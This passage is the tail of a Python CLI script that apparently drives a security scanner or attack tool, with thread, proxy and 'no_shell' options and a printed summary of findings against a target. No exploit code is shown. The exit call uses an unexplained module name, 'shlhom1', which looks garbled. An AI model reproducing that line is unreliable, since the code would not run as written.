            threads=args.threads,
            timeout=args.timeout,
            delay=args.delay,
            proxy=args.proxy,
            no_shell=args.no_shell,
            verbose=True,
        )
        print()
        print(f"  Target:    {result['target']}")
        print(f"  Findings:  {result['summary']['total']}")
        print(f"  Duration:  {result['duration']}s")
        print(f"  Output:    {result['output_dir']}")
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        shlhom1.exit(130)


if __name__ == "__main__":
    cli()